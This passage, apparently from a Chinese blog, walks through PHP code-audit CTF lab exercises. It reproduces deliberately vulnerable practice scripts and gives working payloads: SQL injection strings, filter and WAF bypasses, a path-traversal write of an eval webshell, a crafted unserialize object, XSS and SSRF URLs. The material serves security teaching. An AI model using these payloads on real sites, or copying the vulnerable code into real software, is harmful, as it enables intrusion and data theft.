'Wrong password'; exit; &#125;&#125;highlight_file(__FILE__);?&gt; 练习里的正则写的十分罕见。其实使用到的是php的字符类。除了一看就懂的upper这些，其他的字符类的含义是 12graph 空格以外的可打印字符punct 打印字符，不包括字母数字 主要函数里，第一个正则表示匹配到可打印字符12个以上;第二个正则表示把连续的符号、数字、大写、小写，作为一段，至少分六段;第三个正则表示输入的字符串至少含有符号、数字、大写、小写中的三种类型。 最后与数字进行弱类型比较。payload 142.00e+00000 红日的文章里还提到了一个配置不当写shell的问题。 123456&lt;?phpif(!isset($_GET['option'])) die();$str = addslashes($_GET['option']);$file = file_get_contents('./config.php');$file = preg_replace('|\\$option=\\'.*\\';|', \"\\$option='$str';\", $file);file_put_contents('./config.php', $file); 这个是不带修饰符模式的正则匹配.第一种方法 12http://127.0.0.1/index.php?option=a';%0aphpinfo();//http://127.0.0.1/index.php?option=a 第一个payload写入内容后只有一个单引号被转义的问题。而第二部分再传入一个a时就会因为.*匹配无数次而把\\换掉 还有两种preg_replace的方法、这里提下第二种，也就是还适用于单行(非贪婪)模式的payload。之前安恒的套娃web2里出现过。 12http:&#x2F;&#x2F;127.0.0.1&#x2F;test&#x2F;ph.php?option&#x3D;;phpinfo();http:&#x2F;&#x2F;127.0.0.1&#x2F;test&#x2F;ph.php?option&#x3D;$0 其最后的效果是下面这样的 12&lt;?php$option&#x3D;&#39;$option&#x3D;&#39;;phpinfo();&#39;;&#39;; Day7parse_str()变量覆盖 parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量。 所以此处存在的变量问题就是parse_str()处理了我们可控的参数后,是可以起到控制全局变量的效果的。因此可以控制$config变量及其对应的参数。达成变量覆盖。 解决这类变量覆盖问题的最好方法还是通过检查某一变量是否已经设定过了(isset())。这样在没有设定过变量的else分支才能安全使用parse_str() 练习123456789//index.php&lt;?php$a = “hongri”;$id = $_GET['id'];@parse_str($id);if ($a[0] != 'QNKCDZO' &amp;&amp; md5($a[0]) == md5('QNKCDZO')) &#123; echo '&lt;a href=\"uploadsomething.php\"&gt;flag is here&lt;/a&gt;';&#125;?&gt; 1234567891011121314151617181920212223242526272829303132333435363738//uploadsomething.php&lt;?phpheader(\"Content-type:text/html;charset=utf-8\");$referer = $_SERVER['HTTP_REFERER'];if(isset($referer)!== false) &#123; $savepath = \"uploads/\" . sha1($_SERVER['REMOTE_ADDR']) . \"/\"; if (!is_dir($savepath)) &#123; $oldmask = umask(0); mkdir($savepath, 0777); umask($oldmask); &#125; if ((@$_GET['filename']) &amp;&amp; (@$_GET['content'])) &#123; //$fp = fopen(\"$savepath\".$_GET['filename'], 'w'); $content = 'HRCTF&#123;y0u_n4ed_f4st&#125; by:l1nk3r'; file_put_contents(\"$savepath\" . $_GET['filename'], $content); $msg = 'Flag is here,come on~ ' . $savepath . htmlspecialchars($_GET['filename']) . \"\"; usleep(100000); $content = \"Too slow!\"; file_put_contents(\"$savepath\" . $_GET['filename'], $content); &#125; print &lt;&lt;&lt;EOT&lt;form action=\"\" method=\"get\"&gt;&lt;div class=\"form-group\"&gt;&lt;label for=\"exampleInputEmail1\"&gt;Filename&lt;/label&gt;&lt;input type=\"text\" class=\"form-control\" name=\"filename\" id=\"exampleInputEmail1\" placeholder=\"Filename\"&gt;&lt;/div&gt;&lt;div class=\"form-group\"&gt;&lt;label for=\"exampleInputPassword1\"&gt;Content&lt;/label&gt;&lt;input type=\"text\" class=\"form-control\" name=\"content\" id=\"exampleInputPassword1\" placeholder=\"Contont\"&gt;&lt;/div&gt;&lt;button type=\"submit\" class=\"btn btn-default\"&gt;Submit&lt;/button&gt;&lt;/form&gt;EOT;&#125;else&#123; echo 'you can not see this page';&#125;?&gt; 第一部分是一个比较刻意的parse_str()变量覆盖的用例。只要解决md5弱类型比较的问题就好了 1?id&#x3D;a[0]&#x3D;s878926199a 第二部分先是注意一个referer头要带上。之后就是一个读flag的问题了。因为flag的内容会在挂起0.1s然后被替换掉。所以需要我们去条件竞争。当然这里上传目录是固定的。所以就可以放心发包了。 Day8preg_replace 这是一个自己刚了解CTF不久时接触的一个preg_replace()在/e下存在代码执行的漏洞了。当然这个洞是php5.5版本的 我们的参数可以控制preg_replace的第一，三个参数。达成任意代码执行。 然后当时也是读到一篇文章专门讲到这里payload的构造原本官方的payload 1&#x2F;?.*&#x3D;&#123;$&#123;phpinfo()&#125;&#125; 如果GET请求的参数名存在非法字符，PHP会将其替换成下划线，即.* 会变成 _*而实际可行的payload 1\\S*&#x3D;$&#123;phpinfo()&#125; 练习1234567891011121314151617181920// index.php&lt;?phpinclude 'flag.php';if(isset($_GET['code']))&#123; $code=$_GET['code']; if(strlen($code)&gt;40)&#123; die(\"Long.\"); &#125; if(preg_match(\"/[A-Za-z0-9]+/\",$code))&#123; die(\"NO.\"); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;highlight_file(__FILE);// $hint = \"php function getFlag() to get flag\";?&gt; 12345678910111213141516171819// index2.php&lt;?phpinclude 'flag.php';if(isset($_GET['code']))&#123; $code=$_GET['code']; if(strlen($code)&gt;50)&#123; die(\"Too Long.\"); &#125; if(preg_match(\"/[A-Za-z0-9_]+/\",$code))&#123; die(\"Not Allowed.\"); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;highlight_file(__FILE);// $hint = \"php function getFlag() to get flag\";?&gt; 已经司空见惯的无数字字母webshell书写了 留一个FUZZ脚本 1234567891011&lt;?php$a = str_split('getFlag');for($i = 0; $i &lt; 256; $i++)&#123; $ch = '&#123;'^ chr($i); if (in_array($ch, $a , true)) &#123; echo \"&#123; ^ chr(\".$i.\") = $ch&lt;br&gt;\"; &#125;&#125;echo \"&#123;&#123;&#123;&#123;&#123;&#123;&#123;\"^chr(28).chr(30).chr(15).chr(61).chr(23).chr(26).chr(28);?&gt; payload1 1$_&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot;;$_(); payload2 1$哼&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot;;$哼(); 上次做36d的某道题自己用了最极限的无数字字母且不能异或取反的webshell。也就是通配符加上php临时文件命令执行。那个应该算是比较难用的，但可以解决大部分waf了 Day9str_replace()过滤不当一个比较明显的过滤函数问题。它只是将../替换为空。那么很容易就能使用....//进行双写绕过然后就是require_once()的文件包含了。 CMS实例就是造成路径穿越,得到任意文件读取。当然双写/url二次编码进行路径穿越的技巧其实也算很常见了。 练习1234567891011121314151617181920212223242526272829303132333435363738394041424344/ index.php&lt;?php include 'config.php';include 'function.php';$conn = new mysqli($servername,$username,$password,$dbname);if($conn-&gt;connect_error)&#123; die('连接数据库失败');&#125;$sql = \"SELECT COUNT(*) FROM users\";$result = $conn-&gt;query($sql);if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); $id = $row['COUNT(*)'] + 1;&#125;else die($conn-&gt;error);if(isset($_POST['msg']) &amp;&amp; $_POST['msg'] !=='')&#123; $msg = addslashes($_POST['msg']); $msg = replace_bad_word(convert($msg)); $sql = \"INSERT INTO users VALUES($id,'\".$msg.\"')\"; $result = $conn-&gt;query($sql); if($conn-&gt;error) die($conn-&gt;error);&#125;echo \"&lt;center&gt;&lt;h1&gt;Welcome come to HRSEC message board&lt;/center&gt;&lt;/h1&gt;\";echo &lt;&lt;&lt;EOF&lt;center&gt; &lt;form action=\"index.php\" method=\"post\"&gt; &lt;p&gt;Leave a message: &lt;input type=\"text\" name=\"msg\" /&gt;&lt;input type=\"submit\" value=\"Submit\" /&gt;&lt;/p&gt; &lt;/form&gt;&lt;/center&gt;EOF;$sql = \"SELECT * FROM users\";$result = $conn-&gt;query($sql);if($result-&gt;num_rows &gt; 0)&#123; echo \"&lt;center&gt;&lt;table border='1'&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;message&lt;/th&gt;&lt;tr&gt;&lt;/center&gt;\"; while($row = $result-&gt;fetch_row())&#123; echo \"&lt;tr&gt;&lt;th&gt;$row[0]&lt;/th&gt;&lt;th&gt;$row[1]&lt;/th&gt;&lt;tr&gt;\"; &#125; echo \"&lt;/table&gt;&lt;/center&gt;\";&#125;$conn-&gt;close();?&gt; 12345678910111213141516171819202122// function.php&lt;?php function replace_bad_word($str)&#123; global $limit_words; foreach ($limit_words as $old =&gt; $new) &#123; strlen($old) &gt; 2 &amp;&amp; $str = str_replace($old,trim($new),$str); &#125; return $str;&#125;function convert($str)&#123; return htmlentities($str);&#125;$limit_words = array('造反' =&gt; '造**', '法轮功' =&gt; '法**');foreach (array('_GET','_POST') as $method) &#123; foreach ($$method as $key =&gt; $value) &#123; $$key = $value; &#125;&#125;?&gt; // config.php 123456789101112131415&lt;?php $servername = \"localhost\";$username = \"hongrisec\";$password = \"hongrisec\";$dbname = \"day9\";?&gt;# 搭建CTF环境使用的sql语句create database day9;use day9;create table users(id integer auto_increment not null primary key,message varchar(50));create table flag( flag varchar(40));insert into flag values('HRCTF&#123;StR_R3p1ac3_anD_sQ1_inJ3ctIon_zZz&#125;'); 可控的msg变量被拼接进sql语句。但是却经过了html实体编码,转义,过滤个别词的操作。 不过,在function.php却存在很明显的变量覆盖漏洞。那么我们可以通过覆盖$limit_words数组，来逃逸单引号. 最后payload 121%00&#39; and updatexml(1,concat(0x7e,(select flag from flag),0x7e),1))#&amp;limit_words[\\0\\]&#x3D;1%00&#39; and updatexml(1,concat(0x7e,(select reverse(flag) from flag),0x7e),1))#&amp;limit_words[\\0\\]&#x3D; Day10程序判错未exit() 这里的问题主要是:代码虽然有相应的防御操作，但是程序未立即停止退出，导致程序继续执行的问题 此处extract()得到了一个变量覆盖的利用加上assert()，所以pi变量直接给webshell代码即可 我个人一次体验比较深的经历是:在htb的某个靶机中。有一处php代码中曾经限定只有指定用户访问(检查session),才会显示其ssh密钥。而此时我们的权限是www-data.看似无法获得ssh密钥,但是其代码中出现了疏忽,在对user的session判别后没有立即exit().那么当我们以www-data直接本地curl这一网页时,将可以得到密钥,进而提权。 练习123456789101112131415161718192021222324252627282930313233343536373839404142// index.php&lt;?phpinclude 'config.php';function stophack($string)&#123; if(is_array($string))&#123; foreach($string as $key =&gt; $val) &#123; $string[$key] = stophack($val); &#125; &#125; else&#123; $raw = $string; $replace = array(\"\\\\\",\"\\\"\",\"'\",\"/\",\"*\",\"%5C\",\"%22\",\"%27\",\"%2A\",\"~\",\"insert\",\"update\",\"delete\",\"into\",\"load_file\",\"outfile\",\"sleep\",); $string = str_ireplace($replace, \"HongRi\", $string); $string = strip_tags($string); if($raw!=$string)&#123; error_log(\"Hacking attempt.\"); header('Location: /error/'); &#125; return trim($string); &#125;&#125;$conn = new mysqli($servername, $username, $password, $dbname);if ($conn-&gt;connect_error) &#123; die(\"连接失败: \");&#125;if(isset($_GET['id']) &amp;&amp; $_GET['id'])&#123; $id = stophack($_GET['id']); $sql = \"SELECT * FROM students WHERE id=$id\"; $result = $conn-&gt;query($sql); if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); echo '&lt;center&gt;&lt;h1&gt;查询结果为：&lt;/h1&gt;&lt;pre&gt;'.&lt;&lt;&lt;EOF +----+---------+--------------------+-------+ | id | name | email | score | +----+---------+--------------------+-------+ | &#123;$row['id']&#125; | &#123;$row['name']&#125; | &#123;$row['email']&#125; | &#123;$row['score']&#125; | +----+---------+--------------------+-------+&lt;/center&gt;EOF; &#125;&#125;else die(\"你所查询的对象id值不能为空！\");?&gt; 显然,程序如果检测到非法字符或单词，都会将其替换成字符串 HongRi ，然而并没有立即退出，这样攻击者输入的攻击语句还是会继续被带入数据库查询。只不过这里关键词都被替换成了字符串 HongRi 简单的使用benchmark替换sleep即可盲注 1-1 or if(ascii(mid((select flag from flag),1,1))&#x3D;115,benchmark(200000000,7^3^8),0) Day11php反序列化(第11行正则表达式应改为：’/O:\\d:/‘) 首先确认了存在反序列化。且数据是cookie可控。那么考虑下绕过执行反序列化。 那么看下loaddata里的限制开头不能是O:,即反序列化内容不为对象同时需要不能匹配字符串为O:任意十进制:如果只是第一部分当然可以使用数组绕过。但是这样第二部分还是会匹配到数组中的对象成分。 这里用到的是一个比较老的绕过方法了。即使用O:+绕过。而原理可以涉及到底层源码。函数遇到+号时会继续向下判断，因此可以正常反序列化。 最后就能成功执行写文件webshell了。 练习 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112 &lt;?phpinclude \"config.php\";class HITCON&#123; public $method; public $args; public $conn; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; $this-&gt;__conn(); &#125; function __conn() &#123; global $db_host, $db_name, $db_user, $db_pass, $DEBUG; if (!$this-&gt;conn) $this-&gt;conn = mysql_connect($db_host, $db_user, $db_pass); mysql_select_db($db_name, $this-&gt;conn); if ($DEBUG) &#123; $sql = \"DROP TABLE IF EXISTS users\"; $this-&gt;__query($sql, $back=false); $sql = \"CREATE TABLE IF NOT EXISTS users (username VARCHAR(64), password VARCHAR(64),role VARCHAR(256)) CHARACTER SET utf8\"; $this-&gt;__query($sql, $back=false); $sql = \"INSERT INTO users VALUES ('orange', '$db_pass', 'admin'), ('phddaa', 'ddaa', 'user')\"; $this-&gt;__query($sql, $back=false); &#125; mysql_query(\"SET names utf8\"); mysql_query(\"SET sql_mode = 'strict_all_tables'\"); &#125; function __query($sql, $back=true) &#123; $result = @mysql_query($sql); if ($back) &#123; return @mysql_fetch_object($result); &#125; &#125; function login() &#123; list($username, $password) = func_get_args(); $sql = sprintf(\"SELECT * FROM users WHERE username='%s' AND password='%s'\", $username, md5($password)); $obj = $this-&gt;__query($sql); if ( $obj != false ) &#123; define('IN_FLAG', TRUE); $this-&gt;loadData($obj-&gt;role); &#125; else &#123; $this-&gt;__die(\"sorry!\"); &#125; &#125; function loadData($data) &#123; if (substr($data, 0, 2) !== 'O:' &amp;&amp; !preg_match('/O:\\d:/', $data)) &#123; return unserialize($data); &#125; return []; &#125; function __die($msg) &#123; $this-&gt;__close(); header(\"Content-Type: application/json\"); die( json_encode( array(\"msg\"=&gt; $msg) ) ); &#125; function __close() &#123; mysql_close($this-&gt;conn); &#125; function source() &#123; highlight_file(__FILE__); &#125; function __destruct() &#123; $this-&gt;__conn(); if (in_array($this-&gt;method, array(\"login\", \"source\"))) &#123; @call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; else &#123; $this-&gt;__die(\"What do you do?\"); &#125; $this-&gt;__close(); &#125; function __wakeup() &#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = strtolower(trim(mysql_escape_string($v))); &#125; &#125;&#125;class SoFun&#123; public $file='index.php'; function __destruct()&#123; if(!empty($this-&gt;file)) &#123; include $this-&gt;file; &#125; &#125; function __wakeup()&#123; $this-&gt; file='index.php'; &#125;&#125;if(isset($_GET[\"data\"])) &#123; @unserialize($_GET[\"data\"]);&#125;else &#123; new HITCON(\"source\", array());&#125;?&gt; 12345678//config.php&lt;?php $db_host = 'localhost'; $db_name = 'test'; $db_user = 'root'; $db_pass = '123'; $DEBUG = 'xx';?&gt; 123456// flag.php&lt;?php!defined('IN_FLAG') &amp;&amp; exit('Access Denied');echo \"flag&#123;un3eri@liz3_i3_s0_fun&#125;\";?&gt; 先从简单的看起,首先是SoFun类。显然绕过wakeup即可include可控数据flag.php。但是需要注意flag.php限制了必须defined(&#39;IN_FLAG&#39;)。 注意到HITCON类则有一个跟前面例子一样的loaddata。那就可以用相同方法绕过执行反序列化。 HITCON类login方法显然存在sql注入,且loaddata就是在这里被调用的。那么我们需要让loaddata传入的数据为SoFun类的文件包含序列化数据。而这一数据来自$obj-&gt;role. $obj是sql语句的返回结果。而sql表结构中第三个字段role正是我们需要的。那么只要利用这个sql注入进行union查询就达成$obj-&gt;role可控。 由于析构函数中可以控制我们调用的方法及参数。所以以上思路可以执行。 最后注意的是。HITCON类的wakeup会对sql语句进行转义。所以我们用同样的方法绕过wakeup即可 O:6:&quot;HITCON&quot;:3:{s:6:&quot;method&quot;;s:5:&quot;login&quot;;s:4:&quot;args&quot;;a:2:{s:8:&quot;username&quot;;s:81:&quot;1&#39; union select 1,2,&#39;a:1:{s:2:&quot;xx&quot;;O:%2b5:&quot;SoFun&quot;:2:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}}&#39;%23&quot;;s:8:&quot;password&quot;;s:3:&quot;234&quot;;}} Day12htmlentities()处理不全这里的代码存在一个xss攻击.输出点在一个a标签。同时输出时经过了一次htmlentities.不过这个函数htmlentities()并不能转换所有的特殊字符，是转换除了空格之外的特殊字符，且单引号和双引号需要单独控制此处默认值的话是不会转义单引号的。同时前面在变量覆盖时传入的变量只对$value 进行类型转换，强制变成int类型。但是这部分代码只处理了 $value 变量，没针对 $key 变量进行处理 所以payload是/?a&#39;onclick%3dalert(1)%2f%2f=c绕过intval的同时执行了a标签的onclik事件,达成xss. 练习123456789101112131415161718192021222324252627282930313233343536373839&lt;?phprequire 'db.inc.php';if(isset($_REQUEST['username']))&#123; if(preg_match(\"/(?:\\w*)\\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i\", $_REQUEST['username']))&#123; die(\"Attack detected!!!\"); &#125;&#125;if(isset($_REQUEST['password']))&#123; if(preg_match(\"/(?:\\w*)\\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i\", $_REQUEST['password']))&#123; die(\"Attack detected!!!\"); &#125;&#125;function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET['username']);$password = @clean((string)$_GET['password']);$query='SELECT * FROM ctf.users WHERE name=\\''.$username.'\\' AND pass=\\''.$password.'\\';';#echo $query;$result=mysql_query($query);while($row = mysql_fetch_array($result))&#123; echo \"&lt;tr&gt;\"; echo \"&lt;td&gt;\" . $row['name'] . \"&lt;/td&gt;\"; echo \"&lt;/tr&gt;\";&#125;?&gt; 这里首先要达成sql注入,自然比较关心是否能闭合单引号。但是注意到,此处的htmlentities严格转义了单双引号。不能进行闭合。 但是不用引号闭合的另外的办法就是非常常见的\\进行转义。这样password的值就变成可控的注入位置了。 接下来比较关心的是代码中对username与password关键字的过滤。这里过滤很简单,其他盲注之类的方法当然可以做到。不过这里可以用到一个容易被忘记的小技巧: php.ini中默认如果以 POST 、 GET 方式传入相同的变量，那么用 REQUEST 获取该变量的值将为 POST 该变量的值 所以post数据会覆盖掉get的数据。我们用post传正常的payload、再用get执行sql语句即可 123get:username&#x3D;\\&amp;password&#x3D;union select 1,flag,3,4 from ctf.users%23post: username&#x3D;1&amp;password&#x3D;2 Day13waf失效进行sql注入 本题显然代码中存在sql语句拼接。但是只有一个addslashes,除非是二次注入否则不能利用。然而代码中却出现了很弱智的检查substr(),其长度被定死为20.那么我们只要卡在这个点使用单引号就能导致转义失效了 1user&#x3D;1234567890123456789&#39;&amp;passwd&#x3D;or 1&#x3D;1# 在某CMS中,对sql语句进行了htmlentites处理。但是同时数据在传入前会进行一次urldecode。我们知道,在waf检测后再进行解码操作无疑是具有危害性的。(比如json_deocde如果在waf检测之后的话,就能用unicode绕过任意字符waf) 练习1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253//index.php&lt;?phprequire 'db.inc.php'; function dhtmlspecialchars($string) &#123; if (is_array($string)) &#123; foreach ($string as $key =&gt; $val) &#123; $string[$key] = dhtmlspecialchars($val); &#125; &#125; else &#123; $string = str_replace(array('&amp;', '\"', '&lt;', '&gt;', '(', ')'), array('&amp;amp;', '&amp;quot;', '&amp;lt;', '&amp;gt;', '（', '）'), $string); if (strpos($string, '&amp;amp;#') !== false) &#123; $string = preg_replace('/&amp;amp;((#(\\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;));)/', '&amp;\\\\1', $string); &#125; &#125; return $string; &#125; function dowith_sql($str) &#123; $check = preg_match('/select|insert|update|delete|\\'|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile/is', $str); if ($check) &#123; echo \"非法字符!\"; exit(); &#125; return $str; &#125; // 经过第一个waf处理 foreach ($_REQUEST as $key =&gt; $value) &#123; $_REQUEST[$key] = dowith_sql($value); &#125; // 经过第二个WAF处理 $request_uri = explode(\"?\", $_SERVER['REQUEST_URI']); if (isset($request_uri[1])) &#123; $rewrite_url = explode(\"&amp;\", $request_uri[1]); foreach ($rewrite_url as $key =&gt; $value) &#123; $_value = explode(\"=\", $value); if (isset($_value[1])) &#123; $_REQUEST[$_value[0]] = dhtmlspecialchars(addslashes($_value[1])); &#125; &#125; &#125; // 业务处理 if (isset($_REQUEST['submit'])) &#123; $user_id = $_REQUEST['i_d']; $sql = \"select * from ctf.users where id=$user_id\"; $result=mysql_query($sql); while($row = mysql_fetch_array($result)) &#123; echo \"&lt;tr&gt;\"; echo \"&lt;td&gt;\" . $row['name'] . \"&lt;/td&gt;\"; echo \"&lt;/tr&gt;\"; &#125; &#125;?&gt; 这个练习很有营养。用到了几个php的特性1.传入的非法的 $_GET 数组参数名,PHP会将他们替换成下划线2.传入多个相同参数时,php只会接受最后一个(类似js了)3.$_SERVER[&#39;REQUEST_URI&#39;]方式获得的参数，并不会对参数中的某些特殊字符进行替换 本题代码中,$_REQUEST的数据会经过dowith_sql处理。而之后第二个waf会对$_SERVER[&#39;REQUEST_URI&#39;]进行dhtmlspecialchars()处理. 那么此处思路如下,使用payloadi_d=padyload&amp;i.d=123经过第一次waf时，php会将参数中的某些特殊符号替换为下划线。因此便得到了两个i_d,其中不含恶意代码的i_d内容通过检查。经过第二次waf时,由于代码是通过 $_SERVER[‘REQUEST_URI’] 取参数.检查的实际上是我们初始传入的payload。这里由于是数值型注入,所以可以直接union得到flag payload 1submit&#x3D;&amp;i_d&#x3D;-1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,flag,3,4&#x2F;**&#x2F;from&#x2F;**&#x2F;ctf.users&amp;i.d&#x3D;123 Day14变量覆盖+路径穿越 这里的代码在析构函数里有写文件的方法。因此只要id可控就能控制路径。同时看到构造函数里存在变量覆盖，那么利用起来就不难了。payload 1id&#x3D;..&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&amp;shell&#x3D;&#39;,)%0a&lt;?&#x3D;eval($_REQUEST[byc]);?&gt;&#x2F;&#x2F; 因为实际上写入的内容是： 1234567array( &#39;id&#39;&#x3D;&gt;&#39;..&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;, &#39;lost&#39;&#x3D;&gt;0, &#39;bought&#39;&#x3D;&gt;0, &#39;shell&#39;&#x3D;&gt;&#39;\\&#39;,) &lt;?&#x3D;eval($_REQUEST[byc]);?&gt;&#x2F;&#x2F;&#39;,) 所以需要先闭合,换行后写shell注释即可。 某CMS中也出现了类似的变量覆盖漏洞。比如需要admin权限,而admin权限是由session数组的值决定的。因此可以直接_SESSION[duomi_group_]=1&amp;_SESSION[duomi_admin_]=1覆盖。当然,前提是当前的php开启了session_start() Day15PHP_SELF 关于$_SERVER[&#39;PHP&#39;]:PHP_SELF指当前的页面绝对地址,它是可以控制的. 同时代码中调用了一次urldecode,加上浏览器自带的一次解码,就可以通过二次url编码进行关键字绕过http://www.test.com/index.php/http:%252f%252fblog.dyboy.cn?redirect=test&amp;params=test123此处payload即可达成302跳转 PHP_SELF这个考点之前zer0pts的题目中也有出现过 练习123456789101112131415161718192021222324252627282930// index.php&lt;?php include \"./config.php\";include \"./flag.php\";error_reporting(0);$black_list = \"/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\\'|\";$black_list .= \"=|_| |in|&lt;|&gt;|-|chal|_|\\.|\\(\\)|#|and|if|database|where|concat|insert|having|sleep/i\";if(preg_match($black_list, $_GET['user'])) exit(\":P\"); if(preg_match($black_list, $_GET['pwd'])) exit(\":P\"); $query=\"select user from users where user='$_GET[user]' and pwd='$_GET[pwd]'\";echo \"&lt;h1&gt;query : &lt;strong&gt;&lt;b&gt;&#123;$query&#125;&lt;/b&gt;&lt;/strong&gt;&lt;br&gt;&lt;/h1&gt;\";$result = $conn-&gt;query($query);if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); if($row['user']) echo \"&lt;h2&gt;Welcome &#123;$row['user']&#125;&lt;/h2&gt;\";&#125;$result = $conn-&gt;query(\"select pwd from users where user='admin'\");if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); $admin_pass = $row['pwd'];&#125;if(($admin_pass)&amp;&amp;($admin_pass === $_GET['pwd']))&#123; echo $flag;&#125;highlight_file(__FILE__);?&gt; 没啥意思…跟之前校赛的套路题一样的。regexp进行注入;%00来注释。 Day16$_REQUEST 本题主要是一个$_REQUEST的例子。从题目逻辑上看,首先可以知道是进行了一次ftp的连接,同时用intval来试图处理我们的输入。看似无法绕过。但是实际输出下就会发现有蹊跷: $_REQUEST的内容不受过滤函数影响。所以虽然$_REQUEST 内容是上述三个全局变量的合集,但实际上是不会受影响的。 payload 1?mode&#x3D;1%0a%0dDELETE%20test.file 1可以达成mode的判断。而后续的数据通过crlf被当做命令执行。删除了文件。 因此,需要注意$_REQUEST的使用。假如只对GET,POST,COOKIE三种进行过滤却在代码中拼接REQUEST是不可取的。 练习1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// index.php&lt;?phpfunction check_inner_ip($url)&#123; $match_result=preg_match('/^(http|https)?:\\/\\/.*(\\/)?.*$/',$url); if (!$match_result)&#123; die('url fomat error1'); &#125; try&#123; $url_parse=parse_url($url); &#125; catch(Exception $e)&#123; die('url fomat error2'); &#125; $hostname=$url_parse['host']; $ip=gethostbyname($hostname); $int_ip=ip2long($ip); return ip2long('127.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('10.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('172.16.0.0')&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long('192.168.0.0')&gt;&gt;16 == $int_ip&gt;&gt;16 || ip2long('0.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24;&#125;function safe_request_url($url)&#123; if (check_inner_ip($url))&#123; echo $url.' is inner ip'; &#125; else&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); if ($result_info['redirect_url'])&#123; safe_request_url($result_info['redirect_url']); &#125; curl_close($ch); var_dump($output); &#125;&#125;$url = $_POST['url'];if(!empty($url))&#123; safe_request_url($url);&#125;else&#123; highlight_file(__file__);&#125;//flag in flag.php ?&gt; 1234567891011121314151617181920212223242526272829// flag.php&lt;?phpif (! function_exists('real_ip') ) &#123; function real_ip() &#123; $ip = $_SERVER['REMOTE_ADDR']; if (is_null($ip) &amp;&amp; isset($_SERVER['HTTP_X_FORWARDED_FOR']) &amp;&amp; preg_match_all('#\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;#s', $_SERVER['HTTP_X_FORWARDED_FOR'], $matches)) &#123; foreach ($matches[0] AS $xip) &#123; if (!preg_match('#^(10|172\\.16|192\\.168)\\.#', $xip)) &#123; $ip = $xip; break; &#125; &#125; &#125; elseif (is_null($ip) &amp;&amp; isset($_SERVER['HTTP_CLIENT_IP']) &amp;&amp; preg_match('/^([0-9]&#123;1,3&#125;\\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/', $_SERVER['HTTP_CLIENT_IP'])) &#123; $ip = $_SERVER['HTTP_CLIENT_IP']; &#125; elseif (is_null($ip) &amp;&amp; isset($_SERVER['HTTP_CF_CONNECTING_IP']) &amp;&amp; preg_match('/^([0-9]&#123;1,3&#125;\\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/', $_SERVER['HTTP_CF_CONNECTING_IP'])) &#123; $ip = $_SERVER['HTTP_CF_CONNECTING_IP']; &#125; elseif (is_null($ip) &amp;&amp; isset($_SERVER['HTTP_X_REAL_IP']) &amp;&amp; preg_match('/^([0-9]&#123;1,3&#125;\\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/', $_SERVER['HTTP_X_REAL_IP'])) &#123; $ip = $_SERVER['HTTP_X_REAL_IP']; &#125; return $ip; &#125;&#125;$rip = real_ip();if($rip === \"127.0.0.1\") die(\"HRCTF&#123;SSRF_can_give_you_flag&#125;\");else die(\"You IP is &#123;$rip&#125; not 127.0.0.1\");?&gt; 这个应该就是当初郁师傅经典ssrf的原型了。要求从内网ip 127.0.0.1访问flag.php才能得到flag.使用的自然是当初blackhatpdf中分享的关于php及curl间对url解析的差异 1url&#x3D;http:&#x2F;&#x2F;foo@localhost:80@www.bycsec.top&#x2F;flag.php libcurl认第一个@后的作为host。php及其他语言都认最后一个@后的作为host.所以前面绕过内网ip限制。在后面成功执行了curl Day17 md5 raw_output = true这其实是一个很经典的漏洞 =&gt; 如果提到 ffifdyop应该就很熟悉了。传说中的万能密码绕过。 而之所以存在这个绕过的原因是md5这个函数第二个选项就是raw_output。默认为false。但是假如设为true的话MD5报文摘要将以16字节长度的原始二进制格式返回。这样就会存在一些奇怪的字符。因此 ffifdyop 在经过md5后的内容恰好是&#39;or&#39;6\\xc9]\\x99.符合万能密码的要求。 